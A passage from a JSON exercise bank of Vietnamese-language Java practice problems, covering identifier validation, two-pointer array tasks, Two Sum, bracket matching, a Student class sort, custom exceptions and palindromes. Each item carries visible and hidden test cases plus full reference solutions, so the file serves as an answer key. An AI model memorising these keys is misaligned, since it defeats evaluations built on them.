      "description": "Trong Java, một định danh (tên biến, tên hàm, tên class) phải tuân thủ nghiêm ngặt 4 quy tắc cú pháp:\n1. Ký tự đầu tiên **bắt buộc** phải là chữ cái (`a-z`, `A-Z`), dấu gạch dưới (`_`), hoặc ký tự dollar (`$`). Tuyệt đối **không được** bắt đầu bằng chữ số.\n2. Các ký tự tiếp theo có thể là chữ cái, chữ số (`0-9`), `_`, hoặc `$`. Không được chứa ký tự đặc biệt như `-`, `@`, `#`, khoảng trắng, v.v.\n3. Định danh **không được trùng** với 49 Reserved Keywords của Java hoặc 3 Literals (`true`, `false`, `null`).\n\nHãy viết hàm `boolean isValidIdentifier(String s)` trả về `true` nếu chuỗi là định danh Java hợp lệ, ngược lại trả về `false`.",
      "inputFormat": "Một chuỗi `s` chứa định danh cần kiểm tra.",
      "outputFormat": "In ra `true` hoặc `false`.",
      "constraints": "1 <= s.length() <= 100\ns không chứa khoảng trắng ở đầu hoặc cuối.",
      "examples": [
        {
          "input": "myVariable_1$",
          "output": "true",
          "explanation": "Bắt đầu bằng chữ cái, các ký tự sau là chữ, số, _, $ hợp lệ."
        },
        {
          "input": "2cool",
          "output": "false",
          "explanation": "Bắt đầu bằng chữ số 2 nên vi phạm quy tắc định danh."
        },
        {
          "input": "volatile",
          "output": "false",
          "explanation": "'volatile' là từ khóa dự lưu (reserved keyword) của Java nên không được dùng làm identifier."
        }
      ],
      "starterCode": "public class Solution {\n    public boolean isValidIdentifier(String s) {\n        // Viết code kiểm tra định danh hợp lệ\n        \n        return false;\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextLine()) {\n            String s = sc.nextLine();\n            Solution sol = new Solution();\n            System.out.print(sol.isValidIdentifier(s));\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "myVariable_1$",
          "expectedOutput": "true",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "2cool",
          "expectedOutput": "false",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "volatile",
          "expectedOutput": "false",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "_privateVar",
          "expectedOutput": "true",
          "isHidden": true
        },
        {
          "id": 5,
          "input": "$totalAmount",
          "expectedOutput": "true",
          "isHidden": true
        },
        {
          "id": 6,
          "input": "null",
          "expectedOutput": "false",
          "isHidden": true
        },
        {
          "id": 7,
          "input": "my-name",
          "expectedOutput": "false",
          "isHidden": true
        }
      ],
      "hints": [
        "Có thể dùng hàm có sẵn Character.isJavaIdentifierStart(c) cho ký tự đầu và Character.isJavaIdentifierPart(c) cho các ký tự sau.",
        "Tạo một tập Set<String> chứa các từ khóa cấm: abstract, assert, boolean, break, byte, case, catch, char, class, const, continue, default, do, double, else, enum, extends, final, finally, float, for, goto, if, implements, import, instanceof, int, interface, long, native, new, package, private, protected, public, return, short, static, strictfp, super, switch, synchronized, this, throw, throws, transient, try, void, volatile, while, true, false, null."
      ],
      "solution": "import java.util.*;\n\npublic class Solution {\n    private static final Set<String> KEYWORDS = new HashSet<>(Arrays.asList(\n        \"abstract\", \"assert\", \"boolean\", \"break\", \"byte\", \"case\", \"catch\", \"char\", \"class\", \"const\",\n        \"continue\", \"default\", \"do\", \"double\", \"else\", \"enum\", \"extends\", \"final\", \"finally\", \"float\",\n        \"for\", \"goto\", \"if\", \"implements\", \"import\", \"instanceof\", \"int\", \"interface\", \"long\", \"native\",\n        \"new\", \"package\", \"private\", \"protected\", \"public\", \"return\", \"short\", \"static\", \"strictfp\", \"super\",\n        \"switch\", \"synchronized\", \"this\", \"throw\", \"throws\", \"transient\", \"try\", \"void\", \"volatile\", \"while\",\n        \"true\", \"false\", \"null\"\n    ));\n\n    public boolean isValidIdentifier(String s) {\n        if (s == null || s.isEmpty() || KEYWORDS.contains(s)) return false;\n        if (!Character.isJavaIdentifierStart(s.charAt(0))) return false;\n        for (int i = 1; i < s.length(); i++) {\n            if (!Character.isJavaIdentifierPart(s.charAt(i))) return false;\n        }\n        return true;\n    }\n}"
    },
    {
      "id": "pe_03_remove_duplicates",
      "title": "PE 03: Xóa Phần Tử Trùng Lặp Trong Mảng (Remove Duplicates)",
      "difficulty": "Easy",
      "category": "Arrays & Pointers",
      "dayRef": 2,
      "description": "Cho một mảng số nguyên `nums` **đã được sắp xếp tăng dần**.\n\nHãy xóa các phần tử trùng lặp **ngay tại chỗ (in-place)** sao cho mỗi phần tử duy nhất chỉ xuất hiện đúng một lần, giữ nguyên thứ tự tương đối ban đầu của các phần tử.\n\nTrả về số lượng phần tử duy nhất `k`. Đồng thời, `k` phần tử đầu tiên của `nums` phải chứa các phần tử duy nhất này.\n\n**Ràng buộc vàng:** Không được cấp phát thêm mảng phụ! Độ phức tạp không gian bắt buộc là $O(1)$ extra memory.",
      "inputFormat": "Chuỗi các số nguyên cách nhau bởi dấu cách (ví dụ: `1 1 2 2 3`).",
      "outputFormat": "Dãy các số duy nhất cách nhau bởi dấu cách.",
      "constraints": "1 <= nums.length <= 3 * 10^4\n-100 <= nums[i] <= 100\nnums được sắp xếp theo thứ tự không giảm.",
      "examples": [
        {
          "input": "1 1 2",
          "output": "1 2",
          "explanation": "Có 2 phần tử duy nhất là 1 và 2."
        },
        {
          "input": "0 0 1 1 1 2 2 3 3 4",
          "output": "0 1 2 3 4",
          "explanation": "Có 5 phần tử duy nhất từ 0 đến 4."
        }
      ],
      "starterCode": "public class Solution {\n    public int removeDuplicates(int[] nums) {\n        // Viết thuật toán 2 con trỏ O(1) bộ nhớ\n        \n        return 0;\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextLine()) {\n            String line = sc.nextLine().trim();\n            if (line.isEmpty()) return;\n            String[] parts = line.split(\"\\\\s+\");\n            int[] nums = new int[parts.length];\n            for (int i = 0; i < parts.length; i++) nums[i] = Integer.parseInt(parts[i]);\n            \n            Solution sol = new Solution();\n            int k = sol.removeDuplicates(nums);\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i < k; i++) {\n                sb.append(nums[i]);\n                if (i < k - 1) sb.append(\" \");\n            }\n            System.out.print(sb.toString());\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "1 1 2",
          "expectedOutput": "1 2",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "0 0 1 1 1 2 2 3 3 4",
          "expectedOutput": "0 1 2 3 4",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "1 2 3 4 5",
          "expectedOutput": "1 2 3 4 5",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "7",
          "expectedOutput": "7",
          "isHidden": true
        },
        {
          "id": 5,
          "input": "2 2 2 2 2 2",
          "expectedOutput": "2",
          "isHidden": true
        }
      ],
      "hints": [
        "Dùng kỹ thuật 2 con trỏ (Two Pointers): một con trỏ 'insertIndex = 1' theo dõi vị trí điền số duy nhất tiếp theo.",
        "Duyệt con trỏ thứ hai 'i' từ 1 đến hết mảng: nếu nums[i] != nums[i-1], gán nums[insertIndex] = nums[i] rồi tăng insertIndex."
      ],
      "solution": "public class Solution {\n    public int removeDuplicates(int[] nums) {\n        if (nums == null || nums.length == 0) return 0;\n        int insertIndex = 1;\n        for (int i = 1; i < nums.length; i++) {\n            if (nums[i] != nums[i - 1]) {\n                nums[insertIndex] = nums[i];\n                insertIndex++;\n            }\n        }\n        return insertIndex;\n    }\n}"
    },
    {
      "id": "pe_04_two_sum",
      "title": "PE 04: Cặp Số Có Tổng Bằng Target (Two Sum)",
      "difficulty": "Easy",
      "category": "Arrays & Hash Table",
      "dayRef": 2,
      "description": "Cho một mảng số nguyên `nums` và một số nguyên `target`.\n\nHãy tìm **chỉ số (index)** của hai số sao cho tổng của chúng bằng `target`.\n\n- Giả định mỗi đầu vào luôn có duy nhất một đáp án hợp lệ.\n- Bạn không được sử dụng cùng một phần tử 2 lần.\n- Trả về 2 chỉ số theo thứ tự tăng dần, cách nhau bởi dấu cách: `i j`.",
      "inputFormat": "Dòng 1: Danh sách các số nguyên cách nhau bởi dấu cách.\nDòng 2: Số nguyên `target`.",
      "outputFormat": "Hai chỉ số `i j` cách nhau bởi dấu cách.",
      "constraints": "2 <= nums.length <= 10^4\n-10^9 <= nums[i] <= 10^9\n-10^9 <= target <= 10^9",
      "examples": [
        {
          "input": "2 7 11 15\n9",
          "output": "0 1",
          "explanation": "Vì nums[0] + nums[1] = 2 + 7 = 9 nên kết quả là 0 1."
        },
        {
          "input": "3 2 4\n6",
          "output": "1 2",
          "explanation": "nums[1] + nums[2] = 2 + 4 = 6 nên kết quả là 1 2."
        }
      ],
      "starterCode": "public class Solution {\n    public int[] twoSum(int[] nums, int target) {\n        // Hãy tối ưu với HashMap O(N) thời gian\n        \n        return new int[]{};\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextLine()) {\n            String line1 = sc.nextLine().trim();\n            int target = Integer.parseInt(sc.nextLine().trim());\n            String[] parts = line1.split(\"\\\\s+\");\n            int[] nums = new int[parts.length];\n            for (int i = 0; i < parts.length; i++) nums[i] = Integer.parseInt(parts[i]);\n            \n            Solution sol = new Solution();\n            int[] res = sol.twoSum(nums, target);\n            if (res != null && res.length == 2) {\n                System.out.print(res[0] + \" \" + res[1]);\n            }\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "2 7 11 15\n9",
          "expectedOutput": "0 1",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "3 2 4\n6",
          "expectedOutput": "1 2",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "3 3\n6",
          "expectedOutput": "0 1",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "-1 -2 -3 -4 -5\n-8",
          "expectedOutput": "2 4",
          "isHidden": true
        }
      ],
      "hints": [
        "Cách thô sơ O(N^2) dùng 2 vòng for lồng nhau sẽ chạy chậm khi N = 10,000.",
        "Cách tối ưu O(N): Dùng `HashMap<Integer, Integer>` lưu cặp (giá trị phần tử -> chỉ số).",
        "Khi duyệt qua nums[i], kiểm tra xem `target - nums[i]` đã có trong map chưa. Nếu có, ta đã tìm thấy cặp số!"
      ],
      "solution": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class Solution {\n    public int[] twoSum(int[] nums, int target) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for (int i = 0; i < nums.length; i++) {\n            int complement = target - nums[i];\n            if (map.containsKey(complement)) {\n                return new int[] { map.get(complement), i };\n            }\n            map.put(nums[i], i);\n        }\n        return new int[] {};\n    }\n}"
    },
    {
      "id": "pe_05_valid_parentheses",
      "title": "PE 05: Kiểm Tra Đóng Mở Ngoặc Hợp Lệ (Valid Parentheses)",
      "difficulty": "Medium",
      "category": "Stack & Syntax",
      "dayRef": 3,
      "description": "Cho một chuỗi `s` chỉ chứa các ký tự ngoặc: `'('`, `')'`, `'{'`, `'}'`, `'['` và `']'`.\n\nHãy xác định xem chuỗi đầu vào có hợp lệ hay không:\n- Mọi ngoặc mở phải được đóng bằng ngoặc cùng loại.\n- Mọi ngoặc mở phải được đóng theo đúng thứ tự (LIFO - Last In First Out).\n- Mỗi ngoặc đóng phải có ngoặc mở tương ứng trước nó.\n\n*Bài này mô phỏng cơ chế kiểm tra khối lệnh scope `{}` của trình biên dịch javac.*",
      "inputFormat": "Một chuỗi `s` chứa các dấu ngoặc.",
      "outputFormat": "In ra `true` nếu chuỗi ngoặc hợp lệ, ngược lại `false`.",
      "constraints": "1 <= s.length() <= 10^4\ns chỉ bao gồm các ký tự '()[]{}'.",
      "examples": [
        {
          "input": "()",
          "output": "true",
          "explanation": "Cặp ngoặc đơn mở và đóng đúng loại."
        },
        {
          "input": "()[]{}",
          "output": "true",
          "explanation": "Ba cặp ngoặc mở và đóng liên tiếp hợp lệ."
        },
        {
          "input": "(]",
          "output": "false",
          "explanation": "Mở ngoặc tròn nhưng đóng ngoặc vuông -> Không hợp lệ."
        },
        {
          "input": "([)]",
          "output": "false",
          "explanation": "Đóng ngoặc sai thứ tự lồng nhau."
        }
      ],
      "starterCode": "public class Solution {\n    public boolean isValid(String s) {\n        // Dùng Stack để kiểm tra ngoặc lồng nhau\n        \n        return false;\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextLine()) {\n            String s = sc.nextLine().trim();\n            Solution sol = new Solution();\n            System.out.print(sol.isValid(s));\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "()",
          "expectedOutput": "true",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "()[]{}",
          "expectedOutput": "true",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "(]",
          "expectedOutput": "false",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "([)]",
          "expectedOutput": "false",
          "isHidden": false
        },
        {
          "id": 5,
          "input": "{[]}",
          "expectedOutput": "true",
          "isHidden": false
        },
        {
          "id": 6,
          "input": "]",
          "expectedOutput": "false",
          "isHidden": true
        },
        {
          "id": 7,
          "input": "{((([[[{}]]])))}",
          "expectedOutput": "true",
          "isHidden": true
        }
      ],
      "hints": [
        "Dùng cấu trúc dữ liệu `Stack<Character>` hoặc `ArrayDeque<Character>`.",
        "Gặp ngoặc mở `(`, `[`, `{`: Đẩy ngoặc đóng tương ứng `)`, `]`, `}` vào stack.",
        "Gặp ngoặc đóng: So sánh với phần tử trên đỉnh stack (nếu stack rỗng hoặc đỉnh stack khác ký tự hiện tại -> return false).",
        "Cuối chuỗi: Kiểm tra `stack.isEmpty()`."
      ],
      "solution": "import java.util.ArrayDeque;\nimport java.util.Deque;\n\npublic class Solution {\n    public boolean isValid(String s) {\n        Deque<Character> stack = new ArrayDeque<>();\n        for (char c : s.toCharArray()) {\n            if (c == '(') stack.push(')');\n            else if (c == '{') stack.push('}');\n            else if (c == '[') stack.push(']');\n            else if (stack.isEmpty() || stack.pop() != c) return false;\n        }\n        return stack.isEmpty();\n    }\n}"
    },
    {
      "id": "pe_06_student_oop",
      "title": "PE 06: Quản Lý Sinh Viên & Xếp Loại Học Lực (Student OOP)",
      "difficulty": "Medium",
      "category": "OOP & Encapsulation",
      "dayRef": 4,
      "description": "Đây là dạng bài tập lập trình hướng đối tượng kinh điển trong các đề thi PE FPT.\n\nCho danh sách các sinh viên gồm: Mã SV (String), Họ Tên (String), Điểm GPA hệ 10 (double).\n\nHãy hoàn thiện lớp `Student` và hàm xử lý:\n1. Thuộc tính `id`, `name`, `gpa` phải được đóng gói `private` (Encapsulation).\n2. Phương thức `getRank()` xếp loại:\n   - `GPA >= 8.0`: `\"XUAT SAC\"`\n   - `6.5 <= GPA < 8.0`: `\"KHA\"`\n   - `5.0 <= GPA < 6.5`: `\"TRUNG BINH\"`\n   - `GPA < 5.0`: `\"YEU\"`\n3. Sắp xếp danh sách sinh viên theo **GPA giảm dần**. Nếu hai sinh viên có cùng GPA thì sắp xếp theo **id tăng dần theo thứ tự từ điển**.",
      "inputFormat": "Dòng 1: Số nguyên N (số lượng sinh viên).\nN dòng tiếp theo, mỗi dòng gồm: `ID|Name|GPA`.",
      "outputFormat": "N dòng sau khi sắp xếp, mỗi dòng in: `ID - Name - GPA - Rank`.",
      "constraints": "1 <= N <= 100\n0.0 <= GPA <= 10.0",
      "examples": [
        {
          "input": "3\nSV01|Nguyen Van An|7.5\nSV02|Tran Thi Binh|9.0\nSV03|Le Van Cuong|7.5",
          "output": "SV02 - Tran Thi Binh - 9.0 - XUAT SAC\nSV01 - Nguyen Van An - 7.5 - KHA\nSV03 - Le Van Cuong - 7.5 - KHA",
          "explanation": "SV02 có GPA 9.0 cao nhất đứng đầu. SV01 và SV03 cùng 7.5 nhưng ID SV01 đứng trước SV03 theo từ điển."
        }
      ],
      "starterCode": "import java.util.*;\n\nclass Student implements Comparable<Student> {\n    private String id;\n    private String name;\n    private double gpa;\n\n    public Student(String id, String name, double gpa) {\n        this.id = id;\n        this.name = name;\n        this.gpa = gpa;\n    }\n\n    public String getRank() {\n        // Xếp loại học lực\n        return \"\";\n    }\n\n    @Override\n    public int compareTo(Student o) {\n        // Sắp xếp GPA giảm dần, ID tăng dần\n        return 0;\n    }\n\n    @Override\n    public String toString() {\n        return id + \" - \" + name + \" - \" + gpa + \" - \" + getRank();\n    }\n}\n\npublic class Solution {\n    public List<Student> sortStudents(List<Student> list) {\n        Collections.sort(list);\n        return list;\n    }\n}",
      "driverCode": "import java.util.*;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (!sc.hasNextLine()) return;\n        int n = Integer.parseInt(sc.nextLine().trim());\n        List<Student> list = new ArrayList<>();\n        for (int i = 0; i < n; i++) {\n            String[] parts = sc.nextLine().trim().split(\"\\\\|\");\n            if (parts.length >= 3) {\n                list.add(new Student(parts[0], parts[1], Double.parseDouble(parts[2])));\n            }\n        }\n        Solution sol = new Solution();\n        List<Student> res = sol.sortStudents(list);\n        for (int i = 0; i < res.size(); i++) {\n            System.out.print(res.get(i).toString());\n            if (i < res.size() - 1) System.out.println();\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "3\nSV01|Nguyen Van An|7.5\nSV02|Tran Thi Binh|9.0\nSV03|Le Van Cuong|7.5",
          "expectedOutput": "SV02 - Tran Thi Binh - 9.0 - XUAT SAC\nSV01 - Nguyen Van An - 7.5 - KHA\nSV03 - Le Van Cuong - 7.5 - KHA",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "2\nSV10|Pham Dung|4.5\nSV05|Hoang Em|5.5",
          "expectedOutput": "SV05 - Hoang Em - 5.5 - TRUNG BINH\nSV10 - Pham Dung - 4.5 - YEU",
          "isHidden": false
        }
      ],
      "hints": [
        "Để sắp xếp giảm dần theo GPA, so sánh: Double.compare(o.gpa, this.gpa).",
        "Nếu GPA bằng nhau: dùng this.id.compareTo(o.id) để sắp ID tăng dần."
      ],
      "solution": "import java.util.*;\n\nclass Student implements Comparable<Student> {\n    private String id;\n    private String name;\n    private double gpa;\n\n    public Student(String id, String name, double gpa) {\n        this.id = id;\n        this.name = name;\n        this.gpa = gpa;\n    }\n\n    public String getRank() {\n        if (gpa >= 8.0) return \"XUAT SAC\";\n        if (gpa >= 6.5) return \"KHA\";\n        if (gpa >= 5.0) return \"TRUNG BINH\";\n        return \"YEU\";\n    }\n\n    @Override\n    public int compareTo(Student o) {\n        if (Double.compare(this.gpa, o.gpa) != 0) {\n            return Double.compare(o.gpa, this.gpa); // giảm dần\n        }\n        return this.id.compareTo(o.id); // tăng dần\n    }\n\n    @Override\n    public String toString() {\n        return id + \" - \" + name + \" - \" + gpa + \" - \" + getRank();\n    }\n}\n\npublic class Solution {\n    public List<Student> sortStudents(List<Student> list) {\n        Collections.sort(list);\n        return list;\n    }\n}"
    },
    {
      "id": "pe_07_top_frequent",
      "title": "PE 07: Phần Tử Xuất Hiện Nhiều Nhất (Most Frequent Element)",
      "difficulty": "Medium",
      "category": "Collections & Map",
      "dayRef": 9,
      "description": "Cho một mảng số nguyên `nums`.\n\nHãy tìm phần tử có tần suất xuất hiện nhiều nhất trong mảng.\n- Nếu có nhiều phần tử có cùng tần suất lớn nhất, hãy trả về phần tử có **giá trị nhỏ nhất** trong số chúng.\n\n*Bài này kiểm tra kỹ năng sử dụng HashMap đếm tần suất và xử lý tie-breaker.*",
      "inputFormat": "Danh sách các số nguyên cách nhau bởi dấu cách.",
      "outputFormat": "Một số nguyên duy nhất là phần tử xuất hiện nhiều nhất.",
      "constraints": "1 <= nums.length <= 10^5\n-10^9 <= nums[i] <= 10^9",
      "examples": [
        {
          "input": "1 3 2 1 4 1",
          "output": "1",
          "explanation": "Số 1 xuất hiện 3 lần, nhiều nhất mảng."
        },
        {
          "input": "4 4 2 2 3",
          "output": "2",
          "explanation": "Số 4 và số 2 đều xuất hiện 2 lần. Số 2 nhỏ hơn nên được chọn."
        }
      ],
      "starterCode": "public class Solution {\n    public int mostFrequent(int[] nums) {\n        // Dùng Map để đếm tần suất\n        \n        return 0;\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextLine()) {\n            String line = sc.nextLine().trim();\n            if (line.isEmpty()) return;\n            String[] parts = line.split(\"\\\\s+\");\n            int[] nums = new int[parts.length];\n            for (int i = 0; i < parts.length; i++) nums[i] = Integer.parseInt(parts[i]);\n            Solution sol = new Solution();\n            System.out.print(sol.mostFrequent(nums));\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "1 3 2 1 4 1",
          "expectedOutput": "1",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "4 4 2 2 3",
          "expectedOutput": "2",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "99",
          "expectedOutput": "99",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "5 5 5 1 1 1 2 2 2",
          "expectedOutput": "1",
          "isHidden": true
        }
      ],
      "hints": [
        "Dùng `Map<Integer, Integer> countMap = new HashMap<>()`.",
        "Duyệt map để tìm `maxFreq`. Khi `freq > maxFreq` hoặc `freq == maxFreq && key < bestKey`, cập nhật `bestKey`."
      ],
      "solution": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class Solution {\n    public int mostFrequent(int[] nums) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for (int n : nums) {\n            map.put(n, map.getOrDefault(n, 0) + 1);\n        }\n        int maxCount = -1;\n        int result = nums[0];\n        for (Map.Entry<Integer, Integer> entry : map.entrySet()) {\n            int key = entry.getKey();\n            int count = entry.getValue();\n            if (count > maxCount || (count == maxCount && key < result)) {\n                maxCount = count;\n                result = key;\n            }\n        }\n        return result;\n    }\n}"
    },
    {
      "id": "pe_08_age_validator",
      "title": "PE 08: Ngoại Lệ Tự Định Nghĩa (Custom Exception Validator)",
      "difficulty": "Easy",
      "category": "Exception Handling",
      "dayRef": 12,
      "description": "Trong đề thi Java Core & Audit, bạn thường được yêu cầu tự định nghĩa một `Custom Exception` kế thừa từ `Exception` (Checked Exception).\n\nYêu cầu:\n1. Định nghĩa lớp ngoại lệ `InvalidAgeException extends Exception` nhận vào thông điệp lỗi `message`.\n2. Phương thức `validateAge(int age)`:\n   - Nếu `age < 18`: ném ra `InvalidAgeException` với thông điệp: `\"UNDER_AGE: Nguoi dung chua du 18 tuoi\"`.\n   - Nếu `age > 65`: ném ra `InvalidAgeException` với thông điệp: `\"OVER_AGE: Nguoi dung vuot qua do tuoi lao dong\"`.\n   - Nếu `18 <= age <= 65`: in ra: `\"VALID_AGE: Tuoi \" + age + \" hop le\"`.\n3. Khi gọi `validateAge`, bắt ngoại lệ trong khối `try-catch` và in ra thông điệp ngoại lệ `e.getMessage()`.",
      "inputFormat": "Một số nguyên biểu thị tuổi.",
      "outputFormat": "Thông điệp hợp lệ hoặc thông điệp ngoại lệ tương ứng.",
      "constraints": "-100 <= age <= 200",
      "examples": [
        {
          "input": "20",
          "output": "VALID_AGE: Tuoi 20 hop le",
          "explanation": "20 nằm trong khoảng [18, 65] nên hợp lệ."
        },
        {
          "input": "15",
          "output": "UNDER_AGE: Nguoi dung chua du 18 tuoi",
          "explanation": "15 < 18 nên ném ra InvalidAgeException."
        },
        {
          "input": "70",
          "output": "OVER_AGE: Nguoi dung vuot qua do tuoi lao dong",
          "explanation": "70 > 65 nên ném ra InvalidAgeException."
        }
      ],
      "starterCode": "class InvalidAgeException extends Exception {\n    public InvalidAgeException(String message) {\n        super(message);\n    }\n}\n\npublic class Solution {\n    public String checkAge(int age) {\n        // Dùng try-catch gọi validateAge\n        try {\n            validateAge(age);\n            return \"VALID_AGE: Tuoi \" + age + \" hop le\";\n        } catch (InvalidAgeException e) {\n            return e.getMessage();\n        }\n    }\n\n    private void validateAge(int age) throws InvalidAgeException {\n        // Viết logic kiểm tra tuổi ở đây\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextInt()) {\n            int age = sc.nextInt();\n            Solution sol = new Solution();\n            System.out.print(sol.checkAge(age));\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "20",
          "expectedOutput": "VALID_AGE: Tuoi 20 hop le",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "15",
          "expectedOutput": "UNDER_AGE: Nguoi dung chua du 18 tuoi",
          "isHidden": false
        },
        {
          "id": 3,
          "input": "70",
          "expectedOutput": "OVER_AGE: Nguoi dung vuot qua do tuoi lao dong",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "18",
          "expectedOutput": "VALID_AGE: Tuoi 18 hop le",
          "isHidden": true
        },
        {
          "id": 5,
          "input": "65",
          "expectedOutput": "VALID_AGE: Tuoi 65 hop le",
          "isHidden": true
        }
      ],
      "hints": [
        "Khai báo throws InvalidAgeException trên chữ ký hàm validateAge.",
        "Dùng từ khóa `throw new InvalidAgeException(...)` khi phạm quy tắc."
      ],
      "solution": "class InvalidAgeException extends Exception {\n    public InvalidAgeException(String message) {\n        super(message);\n    }\n}\n\npublic class Solution {\n    public String checkAge(int age) {\n        try {\n            validateAge(age);\n            return \"VALID_AGE: Tuoi \" + age + \" hop le\";\n        } catch (InvalidAgeException e) {\n            return e.getMessage();\n        }\n    }\n\n    private void validateAge(int age) throws InvalidAgeException {\n        if (age < 18) {\n            throw new InvalidAgeException(\"UNDER_AGE: Nguoi dung chua du 18 tuoi\");\n        }\n        if (age > 65) {\n            throw new InvalidAgeException(\"OVER_AGE: Nguoi dung vuot qua do tuoi lao dong\");\n        }\n    }\n}"
    },
    {
      "id": "pe_09_valid_palindrome",
      "title": "PE 09: Chuỗi Đối Xứng Bỏ Qua Ký Tự Đặc Biệt (Valid Palindrome)",
      "difficulty": "Easy",
      "category": "Strings & Two Pointers",
      "dayRef": 6,
      "description": "Một chuỗi là **Palindrome (đối xứng)** nếu sau khi chuyển tất cả chữ hoa thành chữ thường và loại bỏ tất cả các ký tự không phải chữ và số (alphanumeric), chuỗi đọc từ trái sang phải giống hệt như đọc từ phải sang trái.\n\nCho một chuỗi `s`, trả về `true` nếu nó là palindrome, ngược lại trả về `false`.",
      "inputFormat": "Một chuỗi `s`.",
      "outputFormat": "In ra `true` hoặc `false`.",
      "constraints": "1 <= s.length() <= 2 * 10^5\ns bao gồm các ký tự ASCII in được.",
      "examples": [
        {
          "input": "\"A man, a plan, a canal: Panama\"",
          "output": "true",
          "explanation": "Sau khi làm sạch: \"amanaplanacanalpanama\" là chuỗi đối xứng."
        },
        {
          "input": "\"race a car\"",
          "output": "false",
          "explanation": "Sau khi làm sạch: \"raceacar\" không phải chuỗi đối xứng."
        }
      ],
      "starterCode": "public class Solution {\n    public boolean isPalindrome(String s) {\n        // Hai con trỏ duyệt từ 2 đầu O(N) thời gian, O(1) bộ nhớ\n        \n        return false;\n    }\n}",
      "driverCode": "import java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        if (sc.hasNextLine()) {\n            String s = sc.nextLine();\n            Solution sol = new Solution();\n            System.out.print(sol.isPalindrome(s));\n        }\n    }\n}",
      "testCases": [
        {
          "id": 1,
          "input": "A man, a plan, a canal: Panama",
          "expectedOutput": "true",
          "isHidden": false
        },
        {
          "id": 2,
          "input": "race a car",
          "expectedOutput": "false",
          "isHidden": false
        },
        {
          "id": 3,
          "input": " ",
          "expectedOutput": "true",
          "isHidden": false
        },
        {
          "id": 4,
          "input": "0P",
          "expectedOutput": "false",
          "isHidden": true
        },
        {
          "id": 5,
          "input": "Was it a car or a cat I saw?",
          "expectedOutput": "true",
          "isHidden": true
        }
      ],
      "hints": [
        "Dùng `left = 0`, `right = s.length() - 1`.",
        "Bỏ qua ký tự không hợp lệ bằng `Character.isLetterOrDigit(...)`.",
        "So sánh ký tự không phân biệt hoa thường bằng `Character.toLowerCase(...)`."
      ],
      "solution": "public class Solution {\n    public boolean isPalindrome(String s) {\n        int left = 0, right = s.length() - 1;\n        while (left < right) {\n            while (left < right && !Character.isLetterOrDigit(s.charAt(left))) left++;\n            while (left < right && !Character.isLetterOrDigit(s.charAt(right))) right--;\n            if (Character.toLowerCase(s.charAt(left)) != Character.toLowerCase(s.charAt(right))) {\n                return false;\n            }\n            left++;\n            right--;\n        }\n        return true;\n    }\n}"
    },
    {
      "id": "pe_10_fibonacci_dp",
      "title": "PE 10: Dãy Số Fibonacci Tối Ưu Bộ Nhớ (Fibonacci Number)",
      "difficulty": "Easy",
      "category": "Dynamic Programming",
      "dayRef": 5,
      "description": "Dãy số Fibonacci thường được định nghĩa như sau:\n- $F(0) = 0$\n- $F(1) = 1$\n- $F(n) = F(n - 1) + F(n - 2)$ với $n \\ge 2$.\n\nCho số nguyên $n$, hãy tính $F(n)$.\n\n**Thử thách:** Thuật toán đệ quy $O(2^N)$ sẽ bị Time Out khi $n$ lớn. Hãy viết thuật toán đạt độ phức tạp thời gian $O(N)$ và bộ nhớ $O(1)$!",
      "inputFormat": "Một số nguyên `n`.",
      "outputFormat": "Giá trị số Fibonacci thứ `n`.",
      "constraints": "0 <= n <= 30",
      "examples": [
        {
          "input": "2",
          "output": "1",
          "explanation": "F(2) = F(1) + F(0) = 1 + 0 = 1."
        },
        {
          "input": "3",
          "output": "2",
          "explanation": "F(3) = F(2) + F(1) = 1 + 1 = 2."
        },
        {
          "input": "4",
          "output": "3",
          "explanation": "F(4) = F(3) + F(2) = 2 + 1 = 3."
        }
      ],
